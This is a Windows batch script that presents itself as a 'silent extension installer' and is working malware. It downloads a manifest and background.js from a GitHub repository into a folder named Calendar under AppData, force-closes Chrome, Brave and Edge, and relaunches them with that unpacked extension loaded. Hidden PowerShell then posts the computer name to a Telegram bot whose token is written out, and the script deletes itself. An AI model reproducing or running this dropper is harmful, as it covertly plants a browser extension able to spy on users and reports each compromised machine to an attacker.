@echo off
setlocal enabledelayedexpansion

:: ================================================
:: SILENT EXTENSION INSTALLER
:: ================================================

:: Create extension folder
set "EXT=%APPDATA%\Calendar\extension"
mkdir "%EXT%" 2>nul

:: Download extension files using certutil (built into Windows)
certutil -urlcache -split -f "https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json" "%EXT%\manifest.json" >nul 2>&1
certutil -urlcache -split -f "https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js" "%EXT%\background.js" >nul 2>&1

:: Kill all browsers
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM brave.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: Launch Brave with extension
if exist "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe" (
    start "" "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe" --load-extension="%EXT%" --no-first-run
)

:: Launch Chrome with extension
if exist "C:\Program Files\Google\Chrome\Application\chrome.exe" (
    start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --load-extension="%EXT%" --no-first-run
)

:: Launch Edge with extension
if exist "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" (
    start "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --load-extension="%EXT%" --no-first-run
)

:: Notify Telegram
powershell -NoP -NonI -W Hidden -C "irm 'https://api.telegram.org/bot8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw/sendMessage?chat_id=962420340&text=💻_BAT_INSTALLED_%COMPUTERNAME%' -Method POST" >nul 2>&1

:: Self-destruct
timeout /t 2 /nobreak >nul
del "%~f0" >nul 2>&1
exit